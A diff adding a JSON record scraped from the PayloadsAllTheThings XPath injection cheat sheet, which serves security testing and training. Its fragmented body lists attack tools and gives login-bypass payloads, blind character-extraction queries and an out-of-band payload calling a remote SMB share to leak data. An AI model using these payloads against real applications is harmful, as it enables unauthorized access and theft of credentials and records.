@@ -1,0 +1,20 @@
+{
+  "id": "e6e26230e5f3",
+  "source": "payloads",
+  "title": "PayloadsAllTheThings: XPATH Injection",
+  "url": "https://swisskyrepo.github.io/PayloadsAllTheThings/XPATH%20Injection/",
+  "scraped_at": "2026-03-15T23:07:42.472878",
+  "severity": "high",
+  "vuln_type": "XPATH Injection",
+  "cwe": "CWE-643",
+  "cvss_score": null,
+  "affected_component": null,
+  "description": "XPATH Injection\nXPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.\nSummary\nTools\nMethodology\nBlind Exploitation\nOut Of Band Exploitation\nLabs\nReferences\nTools\norf/xcat\n- Automate XPath injection attacks to retrieve documents\nfeakk/xxxpwn\n- Advanced XPath Injection Tool\naayla-secura/xxxpwn_smart\n- A fork of xxxpwn using predictive text\nmicsoftvn/xpath-blind-explorer\nHarsh",
+  "body": "XPATH Injection\nXPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.\nSummary\nTools\nMethodology\nBlind Exploitation\nOut Of Band Exploitation\nLabs\nReferences\nTools\norf/xcat\n- Automate XPath injection attacks to retrieve documents\nfeakk/xxxpwn\n- Advanced XPath Injection Tool\naayla-secura/xxxpwn_smart\n- A fork of xxxpwn using predictive text\nmicsoftvn/xpath-blind-explorer\nHarshal35/XmlChor\n- Xpath injection exploitation tool\nMethodology\nSimilar to SQL injection, you want to terminate the query properly:\nstring\n(//\nuser\n[\nname\n/\ntext\n()=\n'\" +vuln_var1+ \"'\nand\npassword\n/\ntext\n()=\n'\" +vuln_var1+ \"'\n]/\naccount\n/\ntext\n())\n' or '\n1\n'='\n1\n' or ''='\nx\n' or 1=1 or '\nx\n'='\ny\n/\n//\n/\n/*\n*/\n*\n@*\ncount\n(\n/\nchild\n::\nnode\n())\nx\n' or name()='\nusername\n' or '\nx\n'='\ny\n' and count(/*)=1 and '\n1\n'='\n1\n' and count(/@*)=1 and '\n1\n'='\n1\n' and count(/comment())=1 and '\n1\n'='\n1\n')] | //user/*[contains(*,'\n') and contains(../password,'\nc\n') and starts-with(../password,'\nc\nBlind Exploitation\nSize of a string\nand\nstring\n-\nlength\n(\naccount\n)\n=\nSIZE_INT\nAccess a character with\nsubstring\n, and verify its value the\ncodepoints-to-string\nfunction\nsubstring\n(\n//\nuser\n[\nuserid\n=\n5\n]\n/\nusername\n,\n2\n,\n1\n)\n=\nCHAR_HERE\nsubstring\n(\n//\nuser\n[\nuserid\n=\n5\n]\n/\nusername\n,\n2\n,\n1\n)\n=\ncodepoints\n-\nto\n-\nstring\n(\nINT_ORD_CHAR_HERE\n)\nOut Of Band Exploitation\nhttp\n://\nexample\n.\ncom\n/\n?\ntitle\n=\nFoundation\n&\ntype\n=*&\nrent_days\n=*\nand\ndoc\n(\n'//10.10.10.10/SHARE'\n)\nLabs\nRoot Me - XPath injection - Authentication\nRoot Me - XPath injection - String\nRoot Me - XPath injection - Blind\nReferences\nPlaces of Interest in Stealing NetNTLM Hashes - Osanda Malith Jayathissa - March 24, 2017\nXPATH Injection - OWASP - January 21, 2015\nShare this content\nBack to top",
+  "bounty": null,
+  "disclosed_at": null,
+  "metadata": {
+    "category": "XPATH Injection",
+    "source_repo": "swisskyrepo/PayloadsAllTheThings"
+  }
+}
